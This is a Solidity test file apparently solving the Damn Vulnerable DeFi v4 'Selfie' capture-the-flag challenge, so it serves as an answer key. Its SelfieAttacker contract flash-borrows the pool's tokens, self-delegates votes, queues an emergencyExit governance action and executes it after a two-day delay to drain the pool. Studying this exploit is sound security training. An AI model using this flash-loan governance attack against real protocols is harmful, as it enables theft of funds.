// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // On déploie un contrat attaquant qui va :
        // 1. Emprunter des tokens via flash loan pour avoir le voting power
        // 2. Proposer une action malicieuse dans la gouvernance
        // 3. Attendre le délai de 2 jours
        // 4. Exécuter l'action pour drainer la pool
        SelfieAttacker selfieAttacker = new SelfieAttacker(
            address(pool),
            address(governance),
            address(token),
            recovery
        );
        selfieAttacker.startAttack(); // Lance le flash loan + proposition
        vm.warp(block.timestamp + 2 days); // Fast-forward de 2 jours
        selfieAttacker.executeProposal(); // Execute l'action malicieuse
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
contract SelfieAttacker is IERC3156FlashBorrower {
    // Contrat attaquant pour exploiter la gouvernance via flash loan
    address recovery;
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _pool, 
        address _governance,
        address _token,
        address _recovery
    ){
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function startAttack() external {
        // Lance un flash loan de tous les tokens de la pool
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
    }

    function onFlashLoan(
        address _initiator,
        address /*_token*/,
        uint256 _amount,
        uint256 _fee,
        bytes calldata /*_data*/
    ) external returns (bytes32){

        require(msg.sender == address(pool), "SelfieAttacker: Only pool can call");
        require(_initiator == address(this), "SelfieAttacker: Initiator is not self");
        
        // Pendant le flash loan on a tous les tokens
        // On se délègue les votes à nous-mêmes pour avoir le voting power
        token.delegate(address(this));
        
        // On queue une action malicieuse : emergencyExit vers recovery
        // Ça passe car on a la majorité des votes (>50%)
        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        actionId = _actionId;
        // On approve le remboursement du flash loan
        token.approve(address(pool), _amount+_fee);
        return CALLBACK_SUCCESS;
    }

    function executeProposal() external {
        // Après le délai de 2 jours, on exécute l'action malicieuse
        // Ça va appeler emergencyExit() et transférer tous les tokens vers recovery
        governance.executeAction(actionId);
    }
}